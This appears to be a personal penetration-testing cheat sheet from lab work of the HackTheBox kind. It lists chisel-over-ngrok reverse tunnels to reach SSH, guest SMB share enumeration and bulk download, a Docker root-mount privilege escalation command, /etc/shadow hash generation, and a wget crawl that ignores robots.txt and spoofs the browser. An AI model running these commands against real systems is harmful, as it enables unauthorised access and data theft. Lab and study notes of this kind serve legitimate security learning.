------------------------------------------------------------------------SshOverNgrokAndChisel------------------------------------------------------------------------
pc1 -> pc2

p1:	- ngrok tcp 60000
	- chisel server -p 60000 --reverse
p2: 	- ./chisel_1.7.7_linux_arm64 client 0.tcp.ap.ngrok.io:12274 R:60001:127.0.0.1:22
p1:	- ssh pi@127.0.0.1 -p 60001


./chisel64 server -p 8088 --reverse

./chisel64 client 10.10.16.24:8088 R:8001:127.0.0.1:8001

------------------------------------------------------------------------WgetCralwing------------------------------------------------------------------------
wget --no-clobber --convert-links --random-wait -r -p -c -b --level 1 -E -e robots=off -U mozilla --header="Referer: http://linuxsecrets.com/" --header="Accept-Encoding: compress, gzip" http://dumps.wikimedia.org/dewiki/20140528/

-b: runs it in background and cant see progress
-c: continue getting a partially-downloaded file.  This is useful when you want to finish up a download started by a previous instance of Wget, or by another program
-e: robots=off: act like we are not a robot - not like a crawler - websites dont like robots/crawlers unless they are google/or other famous search engine
-E: gets the right extension of the file, without most html and other files have no extension
-p: get all the page requisites. e.g. get all the image/css/js files linked from the page.
-r: ecursive - downloads full website
-U: pretends to be just like a browser Mozilla is looking at a page instead of a crawler like wget

-nd: do not create a hierarchy of directories when retrieving recursively. With this option turned on, all files will get saved to the current directory, without clobbering
-np: wget will not follow links up the url. e.g. it will not follow a link from devopsa.net/linux/curl.html to devopsa.net/linux.html

--connect-timeout: Set the connect timeout to seconds seconds.  TCP connections that take longer to establish will be aborted
--convert-links: convert links so that they work locally, off-line, instead of pointing to a website online
--limit-rate: imit download speed
--no-clobber: don't overwrite any existing files (used in case the download is interrupted and resumed)
--random-wait: random waits between download
--restrict-file-names: change which characters found in remote URLs must be escaped during generation of local filenames
--spider: wget will behave as a Web spider, which means that it will not download the pages, just check that they are there
--tries: set number of retries to number
--user-agent: identify as agent-string to the HTTP server

--------------------------------------------------------------------------------------etc/shadow--------------------------------------------------------------------------------------
mkpasswd --method=SHA-512 --stdin
openssl passwd -6 -salt xyz  yourpass

*Ref: https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow

--------------------------------------------------------------------------------------SMB(139/445)--------------------------------------------------------------------------------------
smbmap -u "guest" -p "" -P 445 -H 10.10.11.174

smbclient //10.10.11.174/support-tools –U guest -A

smbclient '//10.10.11.174/support-tools' –U guest -A -N -c 'prompt OFF;recurse ON;cd '.';lcd '/home/anhndt/htb/support.htb/';mget *'`

smbclient '\\server\share'
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *

mask "";recurse ON;prompt OFF;mget *

--------------------------------------------------------------------------------------Unclassified--------------------------------------------------------------------------------------
	- Get strings out of C/C++,... : strings password-manager
									 strings -e l password-manager (-e Encrypt type => man strings for more information)
									 
									 xxd password-manager => hexdump or reverse
									 
	- PE with docker: docker run --rm -it -v /:/mnt alpine /bin/sh
					  --rm: delete container when it's done
					  -it: interactive shell
					  -v mount point (ex: /:/mnt => mount root to /mnt of docker container )
					  alpine Linux distribution with very small size ~5MB

	- Find all owner ship:  find / -user michael 2>/dev/null
							find / -group security 2>/dev/null
							find / -group security -ls 2>/dev/null
							find / -type d -perm -o+w
							
							find / -user 1007 -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
							
							
	- Curl upload image: curl --location 'https://bancas.uat.mb-innovationlab.com:443/bancas/api/api/upload/image' --header 'Content-Type: multipart/form-data' --header 'Accept: */*' --form 'image=@"/mnt/c/Users/anhndt/Desktop/photo_2023-03-01_11-23-57.jpg"' --proxy 'http://127.0.0.1:8080' -k
-----------------------------------------------------------------------------------------------------------------------------------------------------------------

